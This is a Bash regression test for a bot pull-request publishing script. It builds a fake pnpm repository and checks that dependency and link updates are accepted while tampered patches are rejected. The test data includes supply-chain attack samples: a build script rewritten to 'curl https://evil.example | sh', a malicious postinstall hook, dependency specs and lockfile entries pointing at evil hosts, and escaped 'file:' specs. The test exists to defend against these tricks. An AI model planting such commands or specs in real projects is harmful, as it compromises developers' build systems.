#!/usr/bin/env bash
# publish-bot-pr.sh 회귀 테스트. 사람이 손으로 돌린다(CI는 부르지 않는다).
#
#   bash .github/scripts/publish-bot-pr.test.sh          # VERBOSE=1이면 통과한 것의 로그도 찍는다
#
# 임시 디렉터리에 가짜 저장소·원격·gh를 만들고, 시나리오마다 패치를 떠서 스크립트에
# 넘긴다. 받아야 할 패치는 PR 브랜치가 원격에 올라가야 한다. 거부해야 할 패치는
# `::error::`와 함께 실패로 끝나야 하고, 원격과 작업 트리가 그대로여야 한다(검사는
# `git apply` 전에 끝난다). 필요한 것: bash, git, jq, perl.
set -euo pipefail

script="$(cd "$(dirname "$0")" && pwd)/publish-bot-pr.sh"
root="$(mktemp -d "${TMPDIR:-/tmp}/publish-bot-pr-test.XXXXXX")"
trap 'rm -rf -- "$root"' EXIT

# 사용자 git 설정(전역 hook·서명 등)이 섞이지 않게 한다.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
export GIT_AUTHOR_NAME=test GIT_AUTHOR_EMAIL=test@example.com
export GIT_COMMITTER_NAME=test GIT_COMMITTER_EMAIL=test@example.com

# 가짜 gh. 호출을 기록하고, `pr list`는 FAKE_PRS(JSON 배열)를 GitHub처럼 --author로
# 거른 뒤(`.author.login`) --jq 식을 적용해 돌려준다.
mkdir -p "$root/bin" "$root/runner"
cat >"$root/bin/gh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$GH_LOG"
case "$1 $2" in
  "pr list")
    expr='.'
    author=''
    while (($#)); do
      case "$1" in
        --jq) expr="$2" ;;
        --author) author="$2" ;;
      esac
      shift
    done
    jq --arg author "$author" '[.[] | select($author == "" or .author.login == $author)]' \
      <<<"${FAKE_PRS:-[]}" | jq -r "$expr"
    ;;
  "pr create") echo "https://github.com/owner/repo/pull/1" ;;
esac
EOF
chmod +x "$root/bin/gh"
export PATH="$root/bin:$PATH" RUNNER_TEMP="$root/runner"

# 픽스처 저장소. 실제 파일의 모양(catalog:·overrides·allowBuilds·lockfile v9)을 줄여 담는다.
seed="$root/seed"
mkdir -p "$seed/packages/x" "$seed/apps/blog/posts" "$seed/.github/workflows"
cat >"$seed/package.json" <<'EOF'
{
  "name": "fixture",
  "private": true,
  "scripts": {
    "build": "turbo run build"
  },
  "devDependencies": {
    "prettier": "^3.9.0"
  },
  "packageManager": "pnpm@12.4.2"
}
EOF
cat >"$seed/packages/x/package.json" <<'EOF'
{
  "name": "x",
  "version": "1.0.0",
  "dependencies": {
    "mermaid": "^11.1.0",
    "react": "catalog:"
  },
  "devDependencies": {
    "vitest": "catalog:"
  }
}
EOF
cat >"$seed/pnpm-workspace.yaml" <<'EOF'
packages:
  - 'packages/*'

overrides:
  # 기존 오버라이드
  postcss: 8.5.28

allowBuilds:
  esbuild: true
  msw: false

catalog:
  react: 19.3.0
  vitest: ^5.0.1
EOF
cat >"$seed/pnpm-lock.yaml" <<'EOF'
lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

overrides:
  postcss: 8.5.28

importers:

  packages/x:
    dependencies:
      mermaid:
        specifier: ^11.1.0
        version: 11.1.0
      react:
        specifier: 'catalog:'
        version: 19.3.0

packages:

  mermaid@11.1.0:
    resolution: {integrity: sha512-AAAA}

  react@19.3.0:
    resolution: {integrity: sha512-BBBB}
    engines: {node: '>=0.10.0'}

  vfile@6.0.3:
    resolution: {integrity: sha512-CCCC}

snapshots:

  mermaid@11.1.0:
    dependencies:
      vfile: 6.0.3

  react@19.3.0: {}

  vfile@6.0.3: {}
EOF
printf -- '---\nstatus: published\n---\n\n[링크](https://old.example.com/a)\n' >"$seed/apps/blog/posts/a.md"
printf 'name: CI\n' >"$seed/.github/workflows/ci.yml"
git -C "$seed" init -q
git -C "$seed" add -A
git -C "$seed" commit -q -m init
git -C "$seed" branch -M main
git clone -q --bare "$seed" "$root/remote.git"

# $1 파일, $2 찾을 문자열, $3 바꿀 문자열(둘 다 리터럴). 못 찾으면 테스트를 멈춘다.
edit() {
  FROM="$2" TO="$3" perl -0pi -e 's/\Q$ENV{FROM}\E/$ENV{TO}/ or die "찾지 못함: $ENV{FROM}\n"' "$1"
}

DEPS='^(package\.json|pnpm-workspace\.yaml|pnpm-lock\.yaml|(apps|packages)/[^/]+(/[^/]+)*/package\.json)$'
POSTS='^apps/blog/posts/.+\.mdx?$'

pass=0
fail=0
run=0
# $1 이름, $2 기대, $3 허용 경로 정규식, $4 작업 트리를 바꾸는 함수, $5… 스크립트에 줄 환경.
# 기대: accept(새 PR, 코멘트 없음) · reject(실패, 아무것도 안 바뀜) · comment(봇 PR #7에
# 코멘트만, 푸시 없음)
scenario() {
  local name="$1" expect="$2" allowed="$3" mutate="$4"
  local work="$root/work-$name" out="$root/out-$name" log="$root/$name.log"
  local rc=0 refs_before refs_after pushed=no dirty ok=no
  export GH_LOG="$root/gh-$name.log"
  : >"$GH_LOG"
  run=$((run + 1))
  git clone -q "$root/remote.git" "$work"
  mkdir -p "$out"
  # `&&`로 잇지 않는다 — 그 안에서는 set -e가 꺼져 edit 실패가 묻힌다.
  (
    cd "$work"
    "$mutate"
    git diff --binary HEAD >"$out/bot.patch"
    git checkout -q -- .
  )
  printf 'chore(deps): 테스트 %s\n' "$name" >"$out/bot-title.txt"
  printf '본문\n' >"$out/bot-body.md"
  printf '이번 점검 요약\n' >"$out/bot-comment.md"

  refs_before="$(git --git-dir="$root/remote.git" for-each-ref --format='%(refname)')"
  (
    cd "$work"
    env OUT_DIR="$out" NAME=bot BRANCH_PREFIX=claude/bot- ALLOWED_PATHS="$allowed" \
      DEFAULT_TITLE='기본 제목' CI_WORKFLOW=ci.yml GITHUB_RUN_NUMBER="$run" "${@:5}" \
      bash "$script"
  ) >"$log" 2>&1 || rc=$?
  refs_after="$(git --git-dir="$root/remote.git" for-each-ref --format='%(refname)')"
  [[ "$refs_before" == "$refs_after" ]] || pushed=yes
  dirty="$(git -C "$work" status --porcelain)"

  case "$expect" in
    accept) [[ $rc -eq 0 && $pushed == yes ]] && ! grep -q '^pr comment' "$GH_LOG" && ok=yes ;;
    reject) [[ $rc -ne 0 && $pushed == no && -z "$dirty" ]] && grep -q '::error::' "$log" && ok=yes ;;
    comment) [[ $rc -eq 0 && $pushed == no ]] && grep -q '^pr comment 7 ' "$GH_LOG" && ok=yes ;;
  esac
  if [[ $ok == yes ]]; then
    pass=$((pass + 1))
    printf 'ok    %-26s %s (rc=%d)\n' "$name" "$expect" "$rc"
    if [[ -n "${VERBOSE:-}" ]]; then sed 's/^/      | /' "$log"; fi
  else
    fail=$((fail + 1))
    printf 'FAIL  %-26s 기대 %s, rc=%d pushed=%s dirty=%s\n' "$name" "$expect" "$rc" "$pushed" "${dirty:+yes}"
    sed 's/^/      | /' "$log"
  fi
}

# --- 받아야 하는 변경 ---------------------------------------------------------

# 의존성 점검이 실제로 하는 일: 기존 의존성 범위 승급, lockfile 재해석(vfile처럼 키
# 이름에 file이 든 줄, URL이 든 deprecated 안내 포함), override 승급·추가(advisory
# URL이 든 주석 포함), catalog 승급, auditConfig 예외 추가.
legit_deps() {
  edit packages/x/package.json '"mermaid": "^11.1.0"' '"mermaid": "^11.4.1"'
  edit pnpm-lock.yaml $'specifier: ^11.1.0\n        version: 11.1.0' $'specifier: ^11.4.1\n        version: 11.4.1'
  edit pnpm-lock.yaml $'  mermaid@11.1.0:\n    resolution: {integrity: sha512-AAAA}' \
    $'  mermaid@11.4.1:\n    resolution: {integrity: sha512-DDDD}\n    deprecated: see https://example.com/why'
  edit pnpm-lock.yaml $'  mermaid@11.1.0:\n    dependencies:\n      vfile: 6.0.3' \
    $'  mermaid@11.4.1:\n    dependencies:\n      vfile: 6.0.4'
  edit pnpm-lock.yaml $'  vfile@6.0.3:\n    resolution' $'  vfile@6.0.4:\n    resolution'
  edit pnpm-lock.yaml '  vfile@6.0.3: {}' '  vfile@6.0.4: {}'
  edit pnpm-lock.yaml $'overrides:\n  postcss: 8.5.28' $'overrides:\n  postcss: 8.5.30'
  edit pnpm-workspace.yaml '  postcss: 8.5.28' \
    $'  postcss: 8.5.30\n  # GHSA-r5fr-rjxr-66jc: https://github.com/advisories/GHSA-r5fr-rjxr-66jc\n  lodash-es: 4.18.1'
  edit pnpm-workspace.yaml '  react: 19.3.0' '  react: 19.3.1'
  printf '\nauditConfig:\n  ignoreGhsas:\n    - GHSA-aaaa-bbbb-cccc\n' >>pnpm-workspace.yaml
}
scenario legit-deps accept "$DEPS" legit_deps

# 링크 점검: 글의 URL 교체(마크다운에는 내용 검사를 걸지 않는다).
legit_post() { edit apps/blog/posts/a.md 'https://old.example.com/a' 'https://web.archive.org/web/https://old.example.com/a'; }
scenario legit-post accept "$POSTS" legit_post

# --- 열린 PR이 있을 때 --------------------------------------------------------

# 봇이 이 저장소 브랜치로 연 PR이 있으면 새 PR 대신 그 PR(#7)에 코멘트만 남긴다.
scenario existing-bot-pr comment "$POSTS" legit_post \
  FAKE_PRS='[{"number":7,"headRefName":"claude/bot-20260901-3","isCrossRepository":false,"author":{"login":"app/github-actions"}}]'

# 같은 접두어라도 포크 PR이나 사람이 연 PR은 봇 PR을 막지 못하고 코멘트도 받지 않는다.
scenario fork-pr-same-prefix accept "$POSTS" legit_post \
  FAKE_PRS='[{"number":8,"headRefName":"claude/bot-evil","isCrossRepository":true,"author":{"login":"mallory"}}]'
scenario human-pr-same-prefix accept "$POSTS" legit_post \
  FAKE_PRS='[{"number":9,"headRefName":"claude/bot-manual","isCrossRepository":false,"author":{"login":"someone"}}]'

# --- 거부해야 하는 변경 -------------------------------------------------------

wf_path() { printf 'on: push\n' >>.github/workflows/ci.yml; }
scenario workflow-path reject "$POSTS" wf_path

pkg_postinstall() { edit packages/x/package.json '"version": "1.0.0",' $'"version": "1.0.0",\n  "scripts": { "postinstall": "node evil.js" },'; }
scenario pkg-postinstall reject "$DEPS" pkg_postinstall

pkg_root_script() { edit package.json '"build": "turbo run build"' '"build": "curl https://evil.example | sh"'; }
scenario pkg-root-script reject "$DEPS" pkg_root_script

pkg_git_spec() { edit packages/x/package.json '"^11.1.0"' '"github:evil/mermaid"'; }
scenario pkg-git-spec reject "$DEPS" pkg_git_spec

pkg_shorthand() { edit packages/x/package.json '"^11.1.0"' '"evil/mermaid#main"'; }
scenario pkg-github-shorthand reject "$DEPS" pkg_shorthand

pkg_tarball() { edit packages/x/package.json '"^11.1.0"' '"https://evil.example/m.tgz"'; }
scenario pkg-tarball-url reject "$DEPS" pkg_tarball

pkg_dir() { edit packages/x/package.json '"^11.1.0"' '".."'; }
scenario pkg-directory-spec reject "$DEPS" pkg_dir

pkg_local_tgz() { edit packages/x/package.json '"^11.1.0"' '"11.1.0.tgz"'; }
scenario pkg-local-tarball reject "$DEPS" pkg_local_tgz

pkg_alias() { edit packages/x/package.json '"^11.1.0"' '"npm:evil-mermaid@11.1.0"'; }
scenario pkg-npm-alias reject "$DEPS" pkg_alias

# JSON 유니코드 이스케이프로 쓴 `file:`(역슬래시 + u0066). 역슬래시는 $'\x5c'로 만든다.
pkg_escape() {
  local bs=$'\x5c'
  edit packages/x/package.json '"^11.1.0"' "\"${bs}u0066ile:../evil\""
  grep -q -F "${bs}u0066ile" packages/x/package.json
}
scenario pkg-json-escape reject "$DEPS" pkg_escape

pkg_new_dep() { edit packages/x/package.json '"react": "catalog:"' $'"react": "catalog:",\n    "turbo-bin": "^1.0.0"'; }
scenario pkg-new-dependency reject "$DEPS" pkg_new_dep

lock_tarball() { edit pnpm-lock.yaml '{integrity: sha512-AAAA}' '{tarball: https://evil.example/m.tgz}'; }
scenario lock-tarball reject "$DEPS" lock_tarball

lock_git() { edit pnpm-lock.yaml '{integrity: sha512-AAAA}' '{commit: 0123abc, repo: git@github.com:evil/m.git, type: git}'; }
scenario lock-git reject "$DEPS" lock_git

ws_pnpmfile() { edit pnpm-workspace.yaml '  postcss: 8.5.28' $'  postcss: 8.5.28\npnpmfile: .pnpmfile.cjs'; }
scenario ws-pnpmfile-in-overrides reject "$DEPS" ws_pnpmfile

ws_registry() { printf 'registry: https://evil.example/\n' >>pnpm-workspace.yaml; }
scenario ws-registry reject "$DEPS" ws_registry

ws_allow_builds() { edit pnpm-workspace.yaml 'msw: false' 'msw: true'; }
scenario ws-allow-builds reject "$DEPS" ws_allow_builds

ws_override_file() { edit pnpm-workspace.yaml '  postcss: 8.5.28' '  postcss: file:../evil'; }
scenario ws-override-file reject "$DEPS" ws_override_file

ws_yaml_escape() { edit pnpm-workspace.yaml '  postcss: 8.5.28' '  postcss: "\x66ile:../evil"'; }
scenario ws-yaml-escape reject "$DEPS" ws_yaml_escape

ws_catalog_link() { edit pnpm-workspace.yaml '  react: 19.3.0' '  react: link:../evil'; }
scenario ws-catalog-link reject "$DEPS" ws_catalog_link

echo
echo "통과 $pass · 실패 $fail"
((fail == 0))
